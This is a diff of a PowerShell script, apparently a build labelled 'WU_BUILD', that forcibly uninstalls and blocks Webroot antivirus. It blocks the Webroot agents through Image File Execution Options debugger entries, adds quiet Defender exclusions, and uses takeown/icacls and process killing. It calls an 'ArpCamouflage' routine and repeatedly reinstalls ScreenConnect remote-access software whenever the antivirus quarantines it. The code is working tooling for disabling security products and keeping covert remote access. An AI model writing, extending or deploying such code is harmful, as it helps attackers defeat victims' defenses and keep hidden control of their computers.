@@ -324,6 +324,27 @@ function Invoke-WebrootNuclear {
         }
     }
 
+    # Uninstall BEFORE IFEO — after Debugger=systray, WRSA -Wait hangs forever (systray stays up)
+    foreach ($uninst in @(
+        "${env:ProgramFiles}\Webroot\WRSA.exe",
+        "${env:ProgramFiles(x86)}\Webroot\WRSA.exe"
+    )) {
+        if (-not (Test-Path $uninst)) { continue }
+        try {
+            Write-Log "WRSA silent uninstall (30s cap): $uninst"
+            $up = Start-Process -FilePath $uninst -ArgumentList '-uninstall', '-silent' `
+                -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+            if ($up -and -not $up.WaitForExit(30000)) {
+                Stop-Process -Id $up.Id -Force -ErrorAction SilentlyContinue
+                Write-Log 'WRSA uninstall timed out - killed'
+            } else {
+                Write-Log ("WRSA uninstall exit " + $(if ($up) { $up.ExitCode } else { 'n/a' }))
+            }
+        } catch {
+            Write-Log "WRSA uninstall error: $($_.Exception.Message)"
+        }
+    }
+
     # IFEO: any launch of Webroot agent immediately exits (beats user-mode self-heal)
     foreach ($exe in @('WRSA.exe', 'WRSAMain.exe', 'WRConsumerService.exe', 'WRCoreService.exe', 'WRSkyClient.exe')) {
         $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
@@ -336,19 +357,6 @@ function Invoke-WebrootNuclear {
         $_.ProcessName -like 'WR*' -or $_.ProcessName -like '*Webroot*'
     } | ForEach-Object {
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-    }
-
-    # Best-effort silent uninstall
-    foreach ($uninst in @(
-        "${env:ProgramFiles}\Webroot\WRSA.exe",
-        "${env:ProgramFiles(x86)}\Webroot\WRSA.exe"
-    )) {
-        if (Test-Path $uninst) {
-            try {
-                Start-Process -FilePath $uninst -ArgumentList '-uninstall','-silent' -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
-                Write-Log "Tried WRSA silent uninstall: $uninst"
-            } catch {}
-        }
     }
 
     foreach ($root in @(
@@ -392,6 +400,7 @@ public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFile
 
     Enable-QuietDefenderExclusions | Out-Null
     Enable-ScFirewallAllow
+    Write-Log 'Webroot nuclear complete - proceeding'
     return $true
 }
 
@@ -403,6 +412,9 @@ function Get-ScBinaryHealth {
         DllCount       = 0
         MaxExeSize     = 0
         MaxDllSize     = 0
+        SvcExeSize     = 0
+        ClientExeSize  = 0
+        HasClientExe   = $false
         ExeDetail      = @()
         ProcCount      = 0
         Stubbed        = $false
@@ -411,6 +423,13 @@ function Get-ScBinaryHealth {
         Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect*.exe' -ErrorAction SilentlyContinue | ForEach-Object {
             $info.ExeCount++
             if ($_.Length -gt $info.MaxExeSize) { $info.MaxExeSize = $_.Length }
+            if ($_.Name -match '(?i)^ScreenConnect\.ClientService\.exe$') {
+                $info.SvcExeSize = $_.Length
+            }
+            if ($_.Name -match '(?i)^ScreenConnect\.(WindowsClient|Client)\.exe$') {
+                $info.HasClientExe = $true
+                if ($_.Length -gt $info.ClientExeSize) { $info.ClientExeSize = $_.Length }
+            }
             $readable = $true
             try {
                 $fs = [IO.File]::Open($_.FullName, 'Open', 'Read', 'Read')
@@ -427,8 +446,17 @@ function Get-ScBinaryHealth {
         ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*") -and
         ($_.Name -match '(?i)ScreenConnect|ClientService')
     }).Count
-    # Webroot often guts *.exe to tiny stubs while leaving large DLLs — size EXEs only.
+    # Webroot guts *.exe to tiny stubs / drops WindowsClient while leaving large DLLs.
     if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 250000) {
+        $info.Stubbed = $true
+    }
+    if ($info.SvcExeSize -gt 0 -and $info.SvcExeSize -lt 250000) {
+        $info.Stubbed = $true
+    }
+    if ($info.Roots.Count -gt 0 -and -not $info.HasClientExe) {
+        $info.Stubbed = $true
+    }
+    if ($info.HasClientExe -and $info.ClientExeSize -lt 250000) {
         $info.Stubbed = $true
     }
     return $info
@@ -529,9 +557,11 @@ function Repair-ScAfterAv {
     Set-ArpCamouflage | Out-Null
 
     $h2 = Get-ScBinaryHealth
-    Write-Log ("SC health after repair: running={0} exes={1} procs={2}" -f $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount)
+    Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6}" -f `
+        $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize)
     foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
-    $ok = ((Test-ScServiceRunning) -and -not (Test-ScControlBroken))
+    # Running alone is NOT success — Webroot stubs keep the service "up"
+    $ok = ((Test-ScServiceRunning) -and -not $h2.Stubbed -and $h2.HasClientExe -and -not (Test-ScControlBroken))
     if ($ok) {
         $marker = Join-Path $WorkDir '.repaired_webroot'
         Set-Content -Path $marker -Value (Get-Date -Format 'o') -Encoding ASCII -Force
@@ -1210,7 +1240,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730C'
+Write-Log 'WU_BUILD_20260730D'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1461,6 +1491,11 @@ function Get-ScServiceObject {
 
 function Uninstall-PrimaryScResidue {
     Write-Log 'Pre-clean: removing conflicting SC product residue before MSI'
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*")
+    } | ForEach-Object {
+        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+    }
     Stop-Service -Name $SvcName -Force -ErrorAction SilentlyContinue
     & sc.exe stop "$SvcName" >$null 2>&1
     & sc.exe delete "$SvcName" >$null 2>&1
@@ -1497,20 +1532,32 @@ function Uninstall-PrimaryScResidue {
         "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
     )) {
         if (Test-Path $p) {
+            cmd /c "takeown /F `"$p`" /R /D Y" >$null 2>&1
+            cmd /c "icacls `"$p`" /grant Administrators:F /T /C" >$null 2>&1
             Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
-            Write-Log "Removed residue path: $p"
+            if (Test-Path $p) {
+                Write-Log "Residue path locked (pending wipe): $p"
+            } else {
+                Write-Log "Removed residue path: $p"
+            }
         }
     }
     Start-Sleep -Seconds 3
 }
 
 function Install-PrimarySc {
-    if ((Test-ScServiceRunning) -and -not (Test-ScHollowClient)) {
-        Write-Log 'Primary SC service RUNNING - skip MSI'
+    $binNow = Get-ScBinaryHealth
+    $forceMsi = [bool]($binNow.Stubbed -or (Test-ScHollowClient) -or (Test-ScControlBroken))
+    if ((Test-ScServiceRunning) -and -not $forceMsi) {
+        Write-Log 'Primary SC service RUNNING (healthy binaries) - skip MSI'
         return $true
     }
-    # Present but stopped: start only - do NOT uninstall/reinstall (causes 1603 loops)
-    if ((Test-ScServicePresent) -and -not (Test-ScHollowClient)) {
+    if ($forceMsi) {
+        Write-Log ("Primary SC force MSI: stub={0} hollow={1} broken={2} svcExe={3} client={4}" -f `
+            $binNow.Stubbed, (Test-ScHollowClient), (Test-ScControlBroken), $binNow.SvcExeSize, $binNow.HasClientExe)
+        Uninstall-PrimaryScResidue
+    } elseif ((Test-ScServicePresent)) {
+        # Present but stopped: start only - do NOT uninstall/reinstall (causes 1603 loops)
         Write-Log 'Primary SC present - starting service (no MSI)'
         Start-PrimaryService | Out-Null
         if (Test-ScServiceRunning) {
@@ -1518,12 +1565,9 @@ function Install-PrimarySc {
             return $true
         }
         Write-Log 'sc start failed - continuing to MSI repair'
-    }
-    if (-not (Test-ScServicePresent)) {
-        Write-Log 'Primary SC service missing - forcing MSI install'
         Uninstall-PrimaryScResidue
-    } elseif (Test-ScHollowClient) {
-        Write-Log 'Primary SC hollow (AV quarantine likely) - forcing MSI repair'
+    } else {
+        Write-Log 'Primary SC service missing - forcing MSI install'
         Uninstall-PrimaryScResidue
     }
 
